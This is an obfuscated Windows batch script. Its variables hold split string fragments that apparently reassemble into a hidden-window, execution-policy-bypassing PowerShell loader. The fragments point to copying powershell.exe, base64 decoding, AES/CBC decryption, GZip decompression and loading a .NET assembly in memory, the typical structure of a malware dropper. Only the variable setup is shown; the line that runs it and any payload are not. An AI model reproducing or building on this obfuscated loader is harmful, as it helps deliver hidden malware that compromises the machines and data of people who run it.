@echo off
set "jYKjyXFgjC=0\"
set "CdmyqJpGhY=we"
set "mwmTybwwYU= /"
set "XtvpSBtLIl=st"
set "cMVOSazKIv=we"
set "hoQBdnUokp=1."
set "HAQUjCuKqr=ws"
set "rSpAzDTSUN=32"
set "otCVjklZue=:\"
set "rrZPINcQHZ=py"
set "sNaIIjUtiW=y "
set "AYUvNfMlSO=ll"
set "tKVQjeONob=Wi"
set "HZZkCgpfXd=.e"
set "mSqkiXPdFx=ow"
set "APRGDDRAay=he"
set "VbmEPeeUPp=do"
set "EaMqOVAhXf=in"
set "mUxyhcnRDf=nd"
set "oKiQzjyURj=em"
set "XghkmVFcbj=ll"
set "JyCKzJePNw=co"
set "xhQXhQNWtP=po"
set "dNrvydjShl=rS"
set "CsjMErgYME=Po"
set "RTzdGIyBvq=xe"
set "FIYxpuVdOh=Sy"
set "bLpxAiHgKf=\W"
set "CcvDGYLuCc=s\"
set "iUELdaxStn=he"
set "arRLaeZTwp=rs"
set "dJcUnOaOnB=\v"
set "IGkLhtwmzC= C"
set "SsXGJPHTYf=cd"
set "mnPEgvKXZX= %~dp0"
set "hjFXhntpNK=  $I"
set "bQWiEHcRFF=$ipx"
set "XsZuzZkBca=r.Su"
set "XOGFEmGzVA=join"
set "zYfmtMffoZ=sion"
set "spUaUZgoqh=V = "
set "MhXrsUNQhj=bstr"
set "tXDrarGAmt=tem."
set "uYhNiECsPc=, (,"
set "anHTyPVHLh=($Qs"
set "QbRVxwHnjS=Obje"
set "zSRoozZQDw===')"
set "FYqKpJYjiX=in $"
set "hJMkmkyLql=]::C"
set "lXDMgvfzJN=)))"
set "aycAmwlHlQ=trea"
set "CaNLRANJXC=();$"
set "rjqhSehgIN=D.Pa"
set "LMlwXlkmXS=ndEx"
set "vefmyMlpDj=ypto"
set "SNERSByRhn=BMKv"
set "UJIGuibVSh=$hZi"
set "NUqUXjtZUE=pher"
set "QMzOhWREsp=($Qs"
set "lTGhNYqaQi=.Ass"
set "paPchQLcWr=eam("
set "hybhzppOCH=daeR"
set "FhDdznoZOy=em.C"
set "HiXqOPmUNt=ne);"
set "FXVGsYWJiX=yste"
set "epowRsLRBv=esaB"
set "lAIacsnkfs=LT, "
set "laWcJLlwri=ptog"
set "SXzcuRgcLZ=oin "
set "hHVVYSfhHz=TllA"
set "SOcjGvLuws==');"
set "vhZWcHYjes=k; }"
set "fVpZIjCrKA=F'[-"
set "pDYFfYBChM=dV1k"
set "iVfPZZHMGi=th('"
set "KIJIqugOdI=ddin"
set "dPMJUeOngX=[Sys"
set "GkhYWPsOwU=;$az"
set "LHrETzLNnl=;$hZ"
set "AhJkGubKNi=pose"
set "sBQsqzoqPD=join"
set "tWcsEwAOZR=urit"
set "pgrMWXdqex=.Key"
set "iGxAHfYQYT=-Obj"
set "QyOnVTflCy=pres"
set "bnwMPQuvAY=;$hZ"
set "HDdcyJZqCV=zm83"
set "JOntolCFhu=R5jf"
set "swDLtNOdic=-4] "
set "OdwpzWMsvx=ose("
set "AfaxYSpwqY=ndEx"
set "OiyWDXDBLV=DNJS"
set "cFIlSZGMLY=Comp"
set "ofvZbBdleL=BC;$"
set "GEttFSTAyB=New-"
set "UhqWaanbpQ=3); "
set "FYcZlrXysu=le  "
set "YMiruNdRyn=ress"
set "pGgMbRAjwU=g = "
set "ipqgmmgvVa=mory"
set "WZGOFHQSgA=nA.D"
set "KzIFkvLCNT=gMod"
set "UhBrTMDSOK=ose("
set "wtawCaUEqk=yste"
set "hgyuxGdcla=O.Me"
set "CqcNPsGjxf=xzIn"
set "UKYPBgcubc=rt]:"
set "GiGaDxkoBJ=bjec"
set "PMtYVWxQgn=16] "
set "PwSFqOqnkQ=pose"
set "kLZJUnOPKd=.Sec"
set "FrfKBPNYJb=;$wN"
set "TkcDWOsNWB=vx);"
set "mOPJWwDkUu= '')"
set "nWUfaMVVoF=Conv"
set "zZuFFgsTYR=MKvx"
set "soeRWsCqeM=)($I"
set "JoxOzodCIZ=oL'["
set "NyoWRZAyev=G) {"
set "wuKXpbZAOU=tsWi"
set "zHImrkuUDl=stem"
set "syvEaFjQcb=.Dis"
set "tLjcQtMuKd=);$i"
set "dEACoMzFbs=P.En"
set "gyVNaDxTpP='gni"
set "vFLbNsKybZ=y.Pa"
set "qbjvpjkfdq=[Sys"
set "vtwUaiYhft=QsKI"
set "YUEFyAYPff=null"
set "uVkcEEISVY=::('"
set "PJbeiLGsVO=ss -"
set "whLUgarxaw=pStr"
set "moobbGClRj=m.Re"
set "kklPICZfWg=nage"
set "fudFbDrNiz=oryS"
set "kHaGkGmYJI=and "
set "LsCMvMNIqO=se()"
set "zgKWpvmsBH=m.IO"
set "FdYZWYmjIk=tS46"
set "jAklIpTBBw=HO3I"
set "iiBotFYamB=x = "
set "HZimVJgaeX=fore"
set "VICaHHadgq=yste"
set "sXMUbKXHRC=aDNK"
set "kZIwtdibcD=x, 0"
set "UxULHsTlNA=$JNK"
set "AotWwQceYa=Fina"
set "EwxXdCdJap=6] -"
set "GSJPArWkgF='[-1"
set "wqhkPYcqIc=.Mod"
set "jBHNzchKGf=nirt"
set "ekZbTbEnpL=)) {"
set "rptPphJfwQ=ing("
set "xMAPEnxNdF=LfyP"
set "cdWWAHoONH= [Sy"
set "CKVRnePlBU=..-1"
set "LyzrAjJGRu= = $"
set "mvoiXgegBB=.Mem"
set "ZkruopGYxA=yTo("
set "jdmxABqcDt=n ''"
set "nFcSOOTNpo== [S"
set "RVzbFGsoOY=Syst"
set "vufcUtpcho=raph"
set "pNNnfGRxhc=Comp"
set "dEIuhiIvUB= [Sy"
set "GLBqwWozDb=$BMK"
set "oEAzOHhOJg=rofi"
set "KvonLvtYMM=gth)"
set "tmvOQXWeVY= = $"
set "FSHgoscOMK=.Cry"
set "iwdMYhihPW=wNDW"
set "rVvjfPFmHh=8kuY"
set "fHgEwzNQZb=Secu"
set "ZpiDOrgIYG=ipxl"
set "dLODnsFIRZ=ke($"
set "XLQKAaHqSK=ispo"
set "LAzhWNcmHU=ress"
set "bkhesvnPIf=raph"
set "gQyLJNDXLB=KIr "
set "tKoViibibk=MKvx"
set "YUHXcdbPHi=::De"
set "ingqFajkqw=hy.A"
set "wvhYpCPEPO=vert"
set "YsNVbEmPOW=[-1."
set "YTYzXsLlfq=]::N"
set "DTBFlrAXCE=$BMK"
set "KItEguFqsX='[-1"
set "vIfSKeSQXE=[IO."
set "quvkMpWOiV=2VUN"
set "IieWLTcmyf=Syst"
set "gMPrZBDfkn=$JNK"
set "TTOiaiuOjZ=y.Ci"
set "DbZgLsVtOC=pxlD"
set "NubUlnweCg=brea"
set "qOUDMiYPGx=d;$i"
set "vokFNgJtSq=KIr."
set "onjRIETDgH=kyhK"
set "DAXDVbrIoe=ion."
set "VoqMsWZmLV=pxlD"
set "bMvsANsLoO=PKCS"
set "MNGceVslCm=tem."
set "TKycWRvTfX=);$x"
set "WYMdqCUkis=bypa"
set "TjagnXzuYM=Bmor"
set "bdnjgKWIez=e = "
set "oghlWsdhQR=] -j"
